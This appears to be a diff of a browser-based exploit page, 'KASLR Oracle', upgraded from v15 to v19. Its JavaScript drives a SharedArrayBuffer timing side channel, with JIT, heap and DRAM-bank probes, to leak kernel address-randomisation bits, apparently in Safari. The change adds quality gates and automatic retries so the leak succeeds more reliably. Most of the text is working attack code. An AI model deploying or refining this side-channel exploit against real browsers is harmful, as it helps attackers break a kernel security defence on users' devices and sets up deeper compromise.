@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>KASLR Oracle v15</title></head>
+<head><meta charset="utf-8"><title>KASLR Oracle v19</title></head>
 <body>
 <pre id="log"></pre>
 <script>
@@ -844,45 +844,95 @@ async function t10(jitData, heapData, bankData, offsetData, entropyData) {
 }
 
 // ─────────────────────────────────────────────────────────────
-// MAIN
+// MAIN (v19: quality-gate auto-retry)
+//
+// Quality gates:
+//   GATE 1: NS >= 5ns/count (SAB counter fast enough for DRAM timing)
+//   GATE 2: T4 clusters >= 3 (enough heap discrimination)
+//   GATE 3: leaked bits >= 9 (<= 1024 candidates)
+//
+// On gate fail: terminate counter, wait 2s, restart from scratch.
+// Max 3 attempts. On all failed, report cause.
 // ─────────────────────────────────────────────────────────────
 (async()=>{
-  log('// timer-kaslr-v15 ready');
-  log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
+  log('// timer-kaslr-v19 ready (quality-gate auto-retry)');
   if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }
 
-  await startCounter();
-  await t1();
-  await new Promise(r=>setTimeout(r,30));
+  const MAX_ATTEMPTS=3;
 
-  await t2();
-  await new Promise(r=>setTimeout(r,30));
+  for(let attempt=1; attempt<=MAX_ATTEMPTS; attempt++){
+    if(attempt>1){
+      log(`\n[*] === RETRY ${attempt}/${MAX_ATTEMPTS} — waiting 2s for Safari to settle ===\n`);
+      await new Promise(r=>setTimeout(r,2000));
+    }
 
-  const jitData=await t3();
-  await new Promise(r=>setTimeout(r,30));
+    log(`${new Date().toISOString().substr(11,12)} === ATTEMPT ${attempt}/${MAX_ATTEMPTS} ===`);
 
-  const heapData=await t4();
-  await new Promise(r=>setTimeout(r,30));
+    await startCounter();
+    await t1();
+    await new Promise(r=>setTimeout(r,30));
 
-  const entropyData=await t6(jitData,heapData);
-  await new Promise(r=>setTimeout(r,30));
+    // GATE 1: SAB speed
+    if(NS < 5.0){
+      log(`[!] GATE1 FAIL: NS=${NS.toFixed(3)}ns/count < 5ns — counter too slow, retrying`);
+      counterWorker.terminate(); counterWorker=null;
+      continue;
+    }
+    log(`[*] GATE1 PASS: ${NS.toFixed(3)}ns/count`);
 
-  const anchorData=await t5(jitData.evictA);
-  await new Promise(r=>setTimeout(r,30));
+    await t2();
+    await new Promise(r=>setTimeout(r,30));
 
-  const bankData=await t7x(anchorData, heapData, jitData.evictA);
-  await new Promise(r=>setTimeout(r,30));
+    const jitData=await t3();
+    if(!jitData){ counterWorker.terminate(); counterWorker=null; continue; }
+    await new Promise(r=>setTimeout(r,30));
 
-  const offsetData=await t9(jitData,heapData,bankData);
-  await new Promise(r=>setTimeout(r,30));
+    const heapData=await t4();
+    await new Promise(r=>setTimeout(r,30));
 
-  await t10(jitData,heapData,bankData,offsetData,entropyData);
+    // GATE 2: cluster count
+    const clusterCount=heapData.clusters.length;
+    if(clusterCount < 3){
+      log(`[!] GATE2 FAIL: T4 clusters=${clusterCount} < 3 — retrying`);
+      counterWorker.terminate(); counterWorker=null;
+      continue;
+    }
+    log(`[*] GATE2 PASS: T4 clusters=${clusterCount}`);
 
-  counterWorker.terminate();
+    const entropyData=await t6(jitData,heapData);
+    await new Promise(r=>setTimeout(r,30));
 
-  const hits=LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
-  log(`\n=== DONE — [!!!]: ${hits.length} ===`);
-  hits.forEach(h=>log(h));
+    // GATE 3: leaked bits
+    if(entropyData.totalLeaked < 9){
+      log(`[!] GATE3 FAIL: leaked=${entropyData.totalLeaked} bits < 9 (${2**entropyData.remaining} candidates) — retrying`);
+      counterWorker.terminate(); counterWorker=null;
+      continue;
+    }
+    log(`[*] GATE3 PASS: ${entropyData.totalLeaked} bits leaked → ${2**entropyData.remaining} candidates`);
+    log(`[*] ALL GATES PASSED on attempt ${attempt} — proceeding`);
+
+    const anchorData=await t5(jitData.evictA);
+    await new Promise(r=>setTimeout(r,30));
+
+    const bankData=await t7x(anchorData, heapData, jitData.evictA);
+    await new Promise(r=>setTimeout(r,30));
+
+    const offsetData=await t9(jitData,heapData,bankData);
+    await new Promise(r=>setTimeout(r,30));
+
+    await t10(jitData,heapData,bankData,offsetData,entropyData);
+
+    counterWorker.terminate(); counterWorker=null;
+
+    const hits=LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
+    log(`\n=== DONE (attempt ${attempt}) — [!!!]: ${hits.length} ===`);
+    hits.forEach(h=>log(h));
+    return;
+  }
+
+  if(counterWorker){ counterWorker.terminate(); counterWorker=null; }
+  log(`\n[!!!] ALL ${MAX_ATTEMPTS} ATTEMPTS FAILED quality gates`);
+  log(`[!!!] Try: close other tabs, reload, or wait 10s and run again`);
 })();
 </script>
 </body>
